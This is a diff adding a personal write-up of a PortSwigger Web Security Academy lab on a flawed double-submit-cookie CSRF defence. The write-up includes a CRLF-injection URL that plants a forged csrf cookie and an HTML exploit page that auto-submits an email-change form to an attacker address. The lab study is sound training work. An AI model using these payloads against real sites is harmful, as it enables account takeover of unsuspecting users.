@@ -42,3 +42,41 @@ Because the application does not verify if the `csrfKey` cookie actually belongs
 4. The lab is successfully solved!
 
 **Key Takeaway / Mitigation**: Anti-CSRF tokens must be strictly cryptographically tied to the user's active session identifier (e.g., the session cookie) on the server side. Additionally, applications must sanitize all user inputs reflected in HTTP headers to prevent CRLF injectio
+
+
+# 6th lab
+
+# 🛡️ Lab: CSRF where token is duplicated in cookie
+**Platform:** PortSwigger Web Security Academy
+**Goal:** Use the exploit server to change the victim's email address.
+**Vulnerability:** CSRF via Flawed Double Submit Cookie Implementation + CRLF Injection.
+
+## 🧠 The Concept
+The application implements the "Double Submit Cookie" pattern for CSRF protection. It expects the CSRF token to be present in both a cookie and a hidden form field. 
+However, the application only checks if the value in the cookie matches the value in the form parameter. It does not validate if the token is cryptographically valid or legally issued by the server. If an attacker can inject an arbitrary cookie into the victim's browser, they can simply invent a fake token, inject it via the cookie, and submit a CSRF payload containing the exact same fake token in the body.
+
+## 🧰 Prerequisites
+* A vulnerability that allows setting arbitrary cookies in the victim's browser (e.g., CRLF injection via a reflected search parameter).
+
+## 🛠️ Step-by-Step Exploitation
+
+### Step 1: Identify Cookie Injection (CRLF)
+1. Use the search functionality on the site.
+2. Observe the HTTP response setting a tracking cookie: `Set-Cookie: LastSearchTerm=test`.
+3. Verify CRLF injection by injecting a new line (`%0d%0a`) into the search term to append a malicious CSRF cookie:
+   `/?search=test%0d%0aSet-Cookie:%20csrf=fake123%3b%20SameSite=None`
+
+### Step 2: Build the Exploit
+1. Navigate to the Exploit Server.
+2. Craft an HTML payload that first forces the victim's browser to execute the CRLF injection (planting the `fake123` cookie) and then immediately submits the CSRF form with the matching `fake123` token.
+   ```html
+   <form action="[https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email](https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email)" method="POST">
+       <input type="hidden" name="email" value="hacker@evil.com">
+       <input type="hidden" name="csrf" value="fake123">
+   </form>
+   <img src="[https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake123%3b%20SameSite=None](https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake123%3b%20SameSite=None)" onerror="document.forms[0].submit();">
+   ```
+3. click the store and then deliver the exploit to victim
+4. The lab is successfully solved
+
+**key Takeaway**:The Double Submit Cookie pattern is inherently fragile if any subdomain or functional endpoint on the architecture has a cookie injection vulnerability. Servers should implement strict validation, tying the CSRF token cryptographically to the server-side session, rather than blindly comparing two client-provided values. 
